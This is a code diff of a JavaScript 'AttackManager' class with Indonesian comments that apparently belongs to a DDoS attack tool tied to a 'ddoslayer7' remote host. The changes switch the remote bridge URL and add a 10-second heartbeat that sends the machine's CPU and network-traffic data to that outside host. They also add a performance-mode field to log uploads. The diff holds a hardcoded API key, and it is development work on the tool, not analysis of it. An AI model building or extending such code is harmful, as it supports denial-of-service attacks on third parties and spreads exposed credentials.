@@ -17,7 +17,7 @@ class AttackManager extends events.EventEmitter {
     static io = null;
     static isInitialized = false;
     // Menggunakan URL lengkap (Protokol + Domain + Path)
-    static remoteBridgeUrl = 'https://ddoslayer7.page.gd/database.php'; 
+    static remoteBridgeUrl = 'https://ddoslayer7.page.gd/index.php'; 
     static apiKey = 'Zenn1221';
 
     static async init(io) {
@@ -39,6 +39,22 @@ class AttackManager extends events.EventEmitter {
                 this.io.emit('process_health', sys);
             }
         }, 2000); // Percepat deteksi load
+
+        // Interval khusus Heartbeat (Setiap 10 detik pasti terkirim)
+        setInterval(async () => {
+            const sys = await this.getSystemInfo();
+            const optimizer = require('./optimalization');
+            this.sendToRemote('save_log', {
+                type: 'heartbeat',
+                message: 'System Heartbeat - Keep Alive',
+                url: 'MONITOR',
+                perf_mode: optimizer.perfMode || 'normal',
+                cpu_info: sys.cpuBrand,
+                cpu_speed: sys.cpuSpeed,
+                net_rx: sys.netRx,
+                net_tx: sys.netTx
+            });
+        }, 10000);
     }
 
     static startTaskScheduler() {
@@ -88,10 +104,12 @@ class AttackManager extends events.EventEmitter {
         
         // Kirim ke remote database untuk mengurangi beban RAM & persistent storage
         this.getSystemInfo().then(sys => {
+            const optimizer = require('./optimalization');
             this.sendToRemote('save_log', {
                 type: type,
                 message: msg,
                 url: 'SYSTEM',
+                perf_mode: optimizer.perfMode || 'normal',
                 cpu_info: sys.cpuBrand,
                 cpu_speed: sys.cpuSpeed,
                 net_rx: sys.netRx,
